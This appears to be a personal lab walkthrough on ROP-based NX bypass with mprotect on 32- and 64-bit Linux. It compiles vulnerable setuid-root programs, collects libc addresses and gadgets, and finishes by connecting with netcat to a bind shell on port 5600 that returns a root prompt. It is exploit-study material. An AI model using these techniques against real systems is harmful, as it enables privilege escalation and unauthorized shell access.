## 32 bit

## mprotect
### compile example file
```robert@laptop:~$ gcc mprotect.c -o mprotect -m32```

### run example file with debugger
```robert@laptop:~$ gdb -q ./mprotect```

### set breakpoint in proper line (check with disas in debugger which line)
```gdb-peda$ break *main+362```
```gdb-peda$ r```

### inspect heap before and after breakpoint
```gdb-peda$ vmmap```

## making stack executable

### compile vulnerable file and set proper permissions
```
robert@laptop:~$ gcc -m32 buf.c -o buf -fno-stack-protector
robert@laptop:~$ sudo chown root buf
robert@laptop:~$ sudo chmod +s buf
```

### inspect file in debugger and check security params
```
robert@laptop:~$ gdb buf -q
gdb-peda$ checksec
```
- should print:
```
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : ENABLED
RELRO     : FULL
```

### get address of mprotect
```
robert@laptop:~$ readelf -a /lib/libc.so.6 | grep mprotect
  1243: 00000000000fafc0    37 FUNC    WEAK   DEFAULT   16 mprotect@@GLIBC_2.2.5
```

### get needed gadgets with ropper (https://github.com/sashs/Ropper)
```
0x00101b41 : pop edx ; pop ecx ; pop ebx ; ret
0x0018a40e : dec ebx ; ret
0x0002b8e1 : inc edx ; ret
```

### insert proper addresses in exploit.py and get payload

### inspect stack before and after payload is inserted
```
```gdb-peda$ vmmap```
```

## 64 bit
- some systems do not allow memory area to be writeable and executable at the same time
- goals:
  1. shellcode in different memory area which is first writeable then executable after shellcode is written into it
  2. stack writeable
-> need fct which copies shellcode from stack to different memory region (memcpy)
- shellcode: executes setuid(0), binds port 5600, executes /bin/sh

### compile vulnerable program
- uses read fct instead of strcpy -> null bytes are no problem
- offset of ret is 120
```
robert@laptop:~$ gcc suid.c -o suid -fno-stack-protector
```

### check memory regions and choose writeable not needed region
```
gdb-peda$ b*main+77
gdb-peda$ r
gdb-peda$ vmmap
0x00007ffff7df3000 0x00007ffff7df5000 rw-p      mapped
```

### get needed addresses of fcts
```
robert@laptop:~$ readelf -a /lib64/libc.so.6 | grep mprotect
  1243: 00000000000fafc0    37 FUNC    WEAK   DEFAULT   16 mprotect@@GLIBC_2.2.5
robert@laptop:~$ readelf -a /lib64/libc.so.6 | grep memcpy
  363: 00000000000aa5b0    13 FUNC    WEAK   DEFAULT   16 wmemcpy@@GLIBC_2.2.5
robert@laptop:~$ readelf -a /lib64/libc.so.6 | grep setuid
  27: 00000000000cdea0   152 FUNC    WEAK   DEFAULT   16 setuid@@GLIBC_2.2.5
```

### get needed addresses of gadgets via ropper
```
0x0123189: pop rdx; pop rsi; ret;
0x0020b8b: pop rdi; ret;
```

### insert proper addresses in exploit64.py and get payload

### check if dest memory is containing shellcode and is executable
```
gdb-peda$ vmmap
  0x00007ffff7dd1000 0x00007ffff7dd2000 r-xp mapped
gdb-peda$ x/16x 0x00007ffff7dd1000
  0x7ffff7dd1000 <initial+704>: 0x9090909090909090 0x9090909090909090 # 90s are NOP Sleds from shellcode
  [...]
```

### check networks ports
```
robert@laptop:~$ netstat -lnp | grep 5600
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
tcp        0      0 0.0.0.0:5600            0.0.0.0:*               LISTEN      -
```

### connect to service
```
robert@laptop:~$ nc 127.0.0.1 5600 -v
Connection to 127.0.0.1 5600 port [tcp/*] succeeded!
id    
uid=0(root) gid=1000(robert) groups=1000(robert),27(sudo)
python -c "import pty; pty.spawn('/bin/bash')"
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@laptop:/home/virtual# whoami
whoami
root
root@laptop:/home/robert#
```